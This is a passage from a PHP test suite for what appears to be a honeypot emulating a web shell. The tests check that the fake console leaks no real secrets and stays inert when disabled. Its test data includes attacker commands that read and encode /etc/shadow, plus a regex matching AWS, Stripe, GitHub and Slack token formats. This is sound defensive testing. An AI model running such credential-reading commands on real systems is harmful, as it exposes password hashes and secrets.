                'ping 8.8.8.8', 'su', 'mount', 'ps aux', 'base64 /etc/shadow', 'id; cat /etc/shadow', 'cat /etc/shadow | base64']) as $cmd) {
                $bodies[] = [$pin, $cmd, $h->post('/admin/root/post', $cmd, '198.51.102.' . (++$i))['body']];
            }
        }
        $shadowHash = explode(':', explode("\n", CannedData::SHADOW)[0])[1];
        foreach ($bodies as [$pin, $cmd, $body]) {
            $why = "{$pin} {$cmd}";
            self::assertShell($body, $why);
            $text = self::text($body);
            if (str_contains($text, '$6$')) {
                self::assertSame('root', $pin, "{$why}: only root ever reads shadow");
                self::assertStringContainsString($shadowHash, $text, "{$why}: and only core's inert hash");
                self::assertSame(1, substr_count($text, '$6$'), $why);
            }
            foreach (['BEGIN OPENSSH', 'BEGIN RSA', 'PRIVATE KEY', 'HTTP/1.1 200', '200 OK', 'Connected to', 'saved', 'written'] as $needle) {
                self::assertStringNotContainsString($needle, $text, "{$why}: {$needle}");
            }
            self::assertDoesNotMatchRegularExpression('~AKIA[0-9A-Z]{16}|sk_(?:live|test)_|ghp_[A-Za-z0-9]{20}|xox[bp]-|eyJ[A-Za-z0-9_-]{10,}\.~', $text, "{$why}: no secret-shaped token");
        }
    }

    // --- 10. gates -----------------------------------------------------------------------------

    /** @return list<array<string,mixed>> */
    private static function queue(ConsoleHarness $h): array
    {
        $f = $h->dir . '/intel.sqlite';
        if (!is_file($f)) {
            return [];
        }
        $rows = (new PDO('sqlite:' . $f))->query('SELECT ip, categories, comment FROM abuse_queue ORDER BY id');

        return $rows === false ? [] : $rows->fetchAll(PDO::FETCH_ASSOC);
    }

    /** @param array<string,mixed>|null $row */
    private static function stable(?array $row): ?array
    {
        if ($row !== null) {
            unset($row['ts']);
        }

        return $row;
    }

    /** @return array<string,array{0:array<string,mixed>,1:list<array{0:string,1:string,2:string,3:?string}>}> */
    public static function gates(): array
    {
        $post = static fn (string $cmd): array => ['POST', '/admin/root/post', '', ConsoleHarness::form($cmd)];

        return [
            'webshell off in the catalog' => [['catalog' => 'gate-off'], [$post('id'), $post('psql -c "select 1"')]],
            'ceiling below critical' => [['env' => ['FUNNYPOT_CEILING' => 'high']], [$post('id'), $post('psql -c "select 1"')]],
            'engine answers nothing' => [[], [['POST', '/admin/root/post', '', 'csrf=x&cmd']]],
            'engine answers nothing, llm on' => [['llm' => true], [['POST', '/admin/root/post', '', 'csrf=x&cmd']]],
        ];
    }

    /**
     * @dataProvider gates
     * @param array<string,mixed> $o
     * @param list<array{0:string,1:string,2:string,3:?string}> $requests
     */
    public function test_outside_the_gates_nothing_changes(array $o, array $requests): void
    {
        $shell = $this->harness($o + ['abuse' => true]);
        $base = $this->harness($o + ['abuse' => true, 'shell' => false]);
        foreach ($requests as $i => [$m, $p, $q, $b]) {
            $ip = '45.79.18.' . (60 + $i);
            $a = $shell->fetch($m, $p, $q, $b, $ip);
            $z = $base->fetch($m, $p, $q, $b, $ip);
            self::assertSame($z['body'], $a['body'], "{$m} {$p} {$b}: same answer");
            self::assertSame(self::stable($z['row']), self::stable($a['row']), "{$m} {$p} {$b}: same logged row");
        }
        self::assertSame(self::queue($base), self::queue($shell), 'the same reports are queued');
        self::assertSame([], $shell->store->writes, 'and the console wrote nothing');
    }
}
